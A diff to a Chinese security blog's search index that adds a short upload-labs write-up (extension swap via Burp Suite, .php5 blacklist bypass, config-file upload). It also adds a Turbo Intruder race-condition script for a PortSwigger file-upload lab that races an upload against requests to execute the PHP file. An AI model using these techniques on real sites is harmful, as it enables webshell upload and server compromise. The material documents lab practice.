@@ -353,6 +353,38 @@ $$</p>
       </categories>
   </entry>
   <entry>
+    <title>【upload-lab靶场】文件上传</title>
+    <url>/posts/c42c29bc/</url>
+    <content><![CDATA[<p>OK，打这个靶场的目的首先是学习学习，其次是看看我目前的能力。那些简单的，几下就过的就直接省略写了，后边能学到东西的再详细写一下。</p>
+<h2 id="Pass-01">Pass-01</h2>
+<p>很简单，把php文件后缀改成jpg，在burpsuite再改回来就可以了。</p>
+<h2 id="Pass-02">Pass-02</h2>
+<p>跟上题一样</p>
+<h2 id="Pass-03">Pass-03</h2>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>后端黑名单机制，别改回php，改成php5。</p>
+</li>
+<li class="lvl-2">
+<p>另外随机化了文件名称，访问的时候注意。</p>
+</li>
+<li class="lvl-2">
+<p>难度上升的还挺快，后端php代码不执行，上传配置文件</p>
+</li>
+<li class="lvl-2">
+</li>
+</ul>
+<p>本文参考：</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>靶场练习</category>
+      </categories>
+      <tags>
+        <tag>upload-lab靶场</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【PortSwigger学院】跨站脚本（XSS）</title>
     <url>/posts/cded1aa8/</url>
     <content><![CDATA[<h2 id="跨站脚本">跨站脚本</h2>
@@ -1053,7 +1085,13 @@ AddType application/x-httpd-php .php</p>
 <p><img src="/posts/34bab347//image-20250507101849368.png" alt="image-20250507101849368"></p>
 <ul class="lvl-0">
 <li class="lvl-2">
-<p>然后构造Tburbo Intruder文件上传竞赛脚本进行攻击，将request1设置为上传php代码的包，将request2设置为上传的php代码的路径。</p>
+<p>然后构造Tburbo Intruder文件上传竞赛脚本进行攻击，脚本如下</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=<span class="number">10</span>,)</span><br><span class="line"></span><br><span class="line">    request1 = <span class="string">&#x27;&#x27;&#x27;&lt;YOUR-POST-REQUEST&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    request2 = <span class="string">&#x27;&#x27;&#x27;&lt;YOUR-GET-REQUEST&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the &#x27;gate&#x27; argument blocks the final byte of each request until openGate is invoked</span></span><br><span class="line">    engine.queue(request1, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        engine.queue(request2, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wait until every &#x27;race1&#x27; tagged request is ready</span></span><br><span class="line">    <span class="comment"># then send the final byte of each request</span></span><br><span class="line">    <span class="comment"># (this method is non-blocking, just like queue)</span></span><br><span class="line">    engine.openGate(<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    engine.complete(timeout=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br></pre></td></tr></table></figure>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>将request1设置为上传php代码的包，将request2设置为上传的php代码的路径。</p>
 </li>
 </ul>
 <p><img src="/posts/34bab347//image-20250507102639395.png" alt="image-20250507102639395"></p>
